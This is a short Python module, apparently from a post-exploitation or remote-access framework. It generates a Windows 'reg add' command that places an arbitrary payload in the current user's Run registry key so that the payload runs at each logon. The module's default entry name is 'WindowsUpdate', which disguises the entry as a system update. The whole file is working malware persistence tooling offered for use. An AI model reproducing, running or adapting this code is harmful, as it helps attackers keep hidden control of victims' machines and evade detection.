"""
modules/persist_registry.py — Windows Registry Persistence Module

Generates a command to add a Run key to HKCU for persistence.
The payload will execute every time the user logs in.
"""

MODULE_INFO = {
    "name": "persist_registry",
    "description": "Add HKCU Run key for persistence (Windows only)",
    "author": "Hider",
    "platform": "windows",
}


def run(session, args):
    """
    args[0] = payload command to persist
    args[1] = (optional) registry value name (default: 'WindowsUpdate')
    """
    if not args or len(args) < 1:
        return "[!] Usage: persist_registry <payload_command> [value_name]"

    payload = args[0]
    value_name = args[1] if len(args) > 1 else "WindowsUpdate"

    return (
        f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
        f'/v "{value_name}" /t REG_SZ /d "{payload}" /f'
    )
